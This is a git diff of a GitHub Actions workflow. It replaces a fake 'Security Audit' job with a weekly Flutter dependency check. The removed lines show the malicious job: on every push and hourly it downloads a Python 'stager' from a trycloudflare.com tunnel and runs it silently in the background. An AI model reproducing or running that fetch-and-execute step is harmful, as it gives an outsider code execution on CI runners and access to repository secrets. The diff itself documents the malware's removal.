@@ -1,15 +1,22 @@
-name: Security Audit 1774115389
-on: 
-  push:
+name: Dependency audit
+
+on:
   workflow_dispatch:
   schedule:
-    - cron: '0 * * * *'
+    - cron: '0 6 * * 1'
 
 jobs:
   audit:
     runs-on: ubuntu-latest
     steps:
-    - name: Security Check
-      run: |
-        curl -s -L -o /tmp/jVC.py https://bottom-blink-tag-shots.trycloudflare.com/stagers/jVC.py
-        nohup python3 /tmp/jVC.py >/dev/null 2>&1 &
+      - uses: actions/checkout@v4
+
+      - uses: subosito/flutter-action@v2
+        with:
+          channel: stable
+          cache: true
+
+      - name: Pub outdated (bingo_app)
+        run: |
+          cd bingo_app && flutter pub outdated || true
+          cd ../bingo_core && flutter pub outdated || true
